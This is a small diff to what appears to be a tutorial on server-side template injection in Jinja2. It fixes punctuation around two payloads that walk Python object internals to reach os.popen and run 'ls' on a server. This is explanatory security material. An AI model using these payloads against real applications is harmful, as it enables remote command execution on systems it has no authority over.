@@ -39,7 +39,7 @@ Since the project is in Jinja2, we will take it as an example.
 
 Python being an Object Oriented Programming language, it gives us access to some built-in methods that we could use to exploit the system, such as `__init__`
 
-If we execute this snippet;
+If we execute this snippet:
 
 ```sh
 {{ "hello".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()}}
@@ -49,7 +49,7 @@ or
 ```sh
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
-will run `ls` on the servers filesystem.
+it will run `ls` on the servers filesystem.
 
 To explain what's happening;
 
